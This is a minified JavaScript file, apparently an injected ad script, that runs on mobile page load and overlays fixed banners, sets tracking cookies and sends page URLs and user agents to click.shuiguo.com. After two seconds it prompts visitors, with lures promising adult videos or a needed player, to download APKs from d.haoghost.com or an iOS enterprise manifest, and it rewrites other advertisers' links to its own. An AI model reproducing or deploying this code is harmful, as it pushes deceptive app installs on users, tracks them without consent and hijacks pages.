var hy_itv=setInterval(function(){function a(a,b){var c=30,d=new Date;d.setTime(d.getTime()+1e3*60*60*24*c),document.cookie=a+"="+escape(b)+";expires="+d.toGMTString()+";path=/"}function b(a){var b,c=new RegExp("(^| )"+a+"=([^;]*)(;|$)");return(b=document.cookie.match(c))?b[2]:null}function n(){var c=parseInt(b("hy_visit_time"));return isNaN(c)&&(c=0),c>=m&&(c=0),a("hy_visit_time",c+g),c}function q(){var a=new Date,b=a.getHours(),c=a.getMinutes();return b>9||0==b&&30>c||9==b&&c>30}function r(){return/ipad|iphone|ipod/i.test(navigator.userAgent)?s():t()}function s(){var a;switch(d){case"16":a="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist";break;default:a="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist"}return a}function t(){var a;switch(d){case"16":a="sybb.10C352.apk";break;default:Math.random(),a=q()?"sybb.10C352.apk":"http://t.cn/R7qFBqD"}return a}function u(a){return"top"==a?e+j[p]:"bottom"==a?e+j[o]:void 0}function v(a){return"top"==a?e+"wb_t2.gif":"bottom"==a?e+"wb_ios2.gif":void 0}function w(){var c=new Date,d=60;if(!b("hycookietime"))return a("hycookietime",c.getTime()),!0;var e=c.getTime(),f=parseInt(b("hycookietime"));return e-f>1e3*60*d?(a("hycookietime",e),!0):!1}function R(a,b){setTimeout(function(){c("http://click.shuiguo.com/index.php?action=index&method=main1","t=undefined&l="+a+"&s="+b+"&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+O,function(){})},0)}if(document&&document.body){clearInterval(hy_itv);var c=function(a,b,c,d){var e=document.createElement("script"),f=document.getElementsByTagName("head")[0],g=null;e.type="text/javascript",e.language="javascript",d&&(this[d]=c),this.jsonpcallback=c;var b=b?"&"+b:"",h=/\?{1}/.test(a),i=h?a.slice(0,a.search(/\?{1}/)):a,j=h?a.slice(a.search(/\?{1}/)+1)+b:b;return e.src=i+"?"+j,f.appendChild(e),e.onload=e.onreadystatechange=function(){this.readyState&&"loaded"!==this.readyState&&"complete"!==this.readyState||(c(null,g),this.onload=this.onreadystatechange=null,this.parentNode.removeChild(this))},g},d=hy_cpc_num||"10",e="http://m.haoghost.com/images/",f="http://d.haoghost.com/",g=2,h=r(),i=s(),j=["wb_b5.gif","wb_n1.gif","wb_b3.gif","wb_n2.gif","wb_b2.gif","wb_b.gif"],k=["http://m.haoghost.com/?f=cpctag_"+d,"http://m.haoghost.com/note.html?f=cpctag_"+d,"http://m.haoghost.com/?f=cpctag_"+d,"http://m.haoghost.com/?f=cpctag_"+d,f+"360xpg.apk",f+"360ysdq.apk"],l=["","","","","\u6b63\u5728\u4e0b\u8f7d\u5feb\u64ad\u9b45\u5f71,\u6fc0\u60c5\u65e0\u7801\u89c6\u5c4f\u968f\u610f\u770b","\u6b63\u5728\u4e0b\u8f7d\u5348\u591c\u89c6\u9891,\u79c1\u5bc6\u73cd\u85cf\u5927\u7247\u4efb\u4f60\u770b"];16==d&&(j=["wb_b3.gif","wb_n1.gif","wb_b5.gif","wb_n2.gif","wb_b2.gif","wb_b.gif"],k=["http://m.haoghost.com/?f=cpctag_"+d,"http://m.haoghost.com/note.html?f=cpctag_"+d,"http://m.haoghost.com/?f=cpctag_"+d,"http://m.haoghost.com/?f=cpctag_"+d,f+"360xpg.apk",f+"360ysdq.apk"],l=["","","","","\u6b63\u5728\u4e0b\u8f7d\u5feb\u64ad\u9b45\u5f71,\u6fc0\u60c5\u65e0\u7801\u89c6\u5c4f\u968f\u610f\u770b","\u6b63\u5728\u4e0b\u8f7d\u5348\u591c\u89c6\u9891,\u79c1\u5bc6\u73cd\u85cf\u5927\u7247\u4efb\u4f60\u770b"]);var m=j.length;(24==d||25==d||26==d||16==d)&&(g=1);var o=n(),p=o==m-1?0:o+1;if(b("hycpc1")&&(h="360ysdq.apk",i="http://www.haima.me/?c=cpapz"),/android/i.test(navigator.userAgent)||/ipad|iphone|ipod/i.test(navigator.userAgent)){var x="tag_"+d+"1",y="tag_"+d+"2",A=(k[o],"http://m.haoghost.com/ios.html?f=cpctag_"+d),B=k[0],C='<a href="'+k[p]+'" id="hy_'+x+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgt" src="'+u("top")+'" width=100%/><span id="hy_cpc_tclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>',D='<a href="'+k[o]+'" id="hy_'+y+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgb" src="'+u("bottom")+'" width=100%/><span id="hy_cpc_bclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>';/ipad|iphone|mac|ios/i.test(navigator.userAgent)&&(B=A,x="tag_"+d+"3",y="tag_"+d+"4",C='<a href="'+A+'" id="hy_'+x+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgt" src="'+v("top")+'" width=100%/><span id="hy_cpc_tclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>',D='<a href="'+A+'" id="hy_'+y+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgb" src="'+v("bottom")+'" width=100%/><span id="hy_cpc_bclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>');var E='<div id="hy_cpc_top" style="text-align: center;display: block;width: 100%;filter: alpha(opacity=90);-moz-opacity: 0.9;-khtml-opacity: 0.9;opacity: 1;position: fixed;top: 0px;left: 0px;background-color: rgb(51, 51, 51);z-index: 2147483647;">'+C+'</div><div id="hy_cpc_bottom" style="text-align: center;display: block;width: 100%;opacity: 1;position: fixed;bottom: 0px;background-color: rgb(51, 51, 51);z-index: 2147483647;right: 0px;">'+D+'</div><div id="hy_cpc_tj" style="display:none"></div>',F=document.createElement("div");F.innerHTML=E,document.body.appendChild(F);var G=window.screen.width;G=G>400?360:G;var H=document.getElementById("hy_"+x),I=document.getElementById("hy_"+y),J=90*G/435,K=document.getElementById("hy_cpc_top"),L=document.getElementById("hy_cpc_bottom"),M=document.getElementById("hy_cpc_imgt"),N=document.getElementById("hy_cpc_imgb");!function(){var a=document.createElement("script"),b=document.getElementById("hy_cpc_tj");a.type="text/javascript",a.language="javascript",a.src="http://s95.cnzz.com/stat.php?id=1253202217",b.appendChild(a)}(),24==d||25==d||26==d||16==d?H.style.display="none":document.body.style["padding-top"]=J+"px",G=G>1305?1305:G,document.body.style["padding-bottom"]=J+"px",document.getElementById("hy_cpc_tclose").addEventListener("touchstart",function(a){return K.style.display="none",document.body.style["padding-top"]="0px",a.stopPropagation?a.stopPropagation():window.event&&(window.event.cancelBubble=!0),!1},!1),document.getElementById("hy_cpc_bclose").addEventListener("touchstart",function(a){return L.style.display="none",document.body.style["padding-bottom"]="0px",a.stopPropagation?a.stopPropagation():window.event&&(window.event.cancelBubble=!0),!1},!1);var O=navigator.userAgent;if(function(){var e=document.getElementsByTagName("title")[0].innerHTML,f=parseInt(b("hyipdata"));0!=f&&1!=f&&/android/i.test(O)&&c("http://m.haoghost.com/request.php?action=index&method=main1","",function(b){0==b&&(h="hlyy4.apk",a("hyipdata","0"),c("http://click.shuiguo.com/index.php?action=index&method=main1","t=undefined&s=tag_888&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+O,function(){})),1==b&&a("hyipdata","1")},"hyipcb"),window.setTimeout(function(){if(18==d||19==d){if(e.indexOf("\u300b")<0||!w())return;e=e.split("\u300b")[0]+"\u300b",e="\u6b63\u5728\u4e3a\u60a8\u4e0b\u8f7d\u64ad\u653e\u5668\uff0c\u5b89\u88c5\u540e\u5373\u53ef\u89c2\u770b"+e}else if(15==d){if(!w())return;e="\u6b63\u5728\u4e0b\u8f7d\u795e\u5947\u5f71\u9662\uff0c\u6d77\u91cf\u89c6\u9891\u4efb\u4f60\u770b"}else if(16==d){if(q())return;if(!w())return;e="\u6b63\u5728\u4e0b\u8f7d\u4e13\u4e1a\u9605\u8bfb\u5668\uff0c\u5168\u56fd\u8d44\u6e90\u6700\u5168\u7684\u79bb\u7ebf\u5c0f\u8bf4APP\uff0c\u9996\u6b21\u5b89\u88c5\u90017\u65e5\u4f1a\u5458\u3002"}else{if(23!=d&&24!=d&&25!=d&&26!=d&&27!=d)return;if(!w())return;e="\u6b63\u5728\u4e0b\u8f7d\u4e13\u4e1a\u9605\u8bfb\u5668\uff0c\u5168\u56fd\u8d44\u6e90\u6700\u5168\u7684\u79bb\u7ebf\u5c0f\u8bf4APP\uff0c\u9996\u6b21\u5b89\u88c5\u90017\u65e5\u4f1a\u5458\u3002"}if(/ipad|iphone|mac|ios/i.test(navigator.userAgent))window.location.href=i,a("hycpc1","1");else if(window.confirm(e))window.location.href=h.indexOf("http")>=0?h:"http://d.haoghost.com/"+h,a("hycpc1","1");else{var c=parseInt(b("hycookietime"));c-=3e6,a("hycookietime",c)}},2e3)}(),(18==d||19==d||27==d||22==d)&&window.setInterval(function(){if(27==d){var a=document.getElementById("lgVshow");a&&a.parentNode.removeChild(a)}if(22==d){var b=document.getElementById("__keyrun_RM_Div");b&&b.parentNode.removeChild(b);var c,e=document.getElementById("viewxxx");e&&e.setAttribute("href",B),window.frames.baidu_clb_slot_iframe_984242_0.document&&(c=window.frames.baidu_clb_slot_iframe_984242_0.document.getElementsByTagName("a")[0]),window.frames.BAIDU_DUP_wrapper_984242_0.document&&(c=window.frames.BAIDU_DUP_wrapper_984242_0.document.getElementsByTagName("a")[0]),c&&c.setAttribute("href",B)}var f=document.getElementById("JS_BottmEX2_Div"),g=document.getElementsByTagName("ins"),h=document.getElementsByTagName("a"),i=[];i[0]="http://cnrdn.com/fyRE",i[1]="http://xiazai.3ddianshiji.com/i/",i[2]="http://download.wuji.com:6677/wuji/setup/",i[3]="http://dl.client.baidu.com/union/",i[4]="http://pc.cyousoft.com/shouqu_126_10.html",i[5]="http://www.baidu.com/cb.php?",i[6]="http://www.z3330.com",i[7]="http://vs.cyousoft.com",f&&(f.style.display="none"),g[0]&&(g[0].style.display="none");for(var g=0;g<h.length;g++){var j=h[g].getAttribute("href");if(j)for(var k=0;k<i.length;k++)if(j.indexOf(i[k])>-1){h[g].setAttribute("href",B);break}}},500),/ipad|iphone|mac|ios/i.test(navigator.userAgent))return;var P=document.createElement("script");P.type="text/javascript",P.language="javascript",P.src="http://js.users.51.la/17318300.js";var Q=document.getElementById("hy_cpc_tj");Q.appendChild(P),""!=l[p]&&M.addEventListener("touchend",function(){R(H.getAttribute("href"),x),alert(l[p])}),""!=l[o]&&N.addEventListener("touchend",function(){R(I.getAttribute("href"),y),alert(l[o])})}}},500);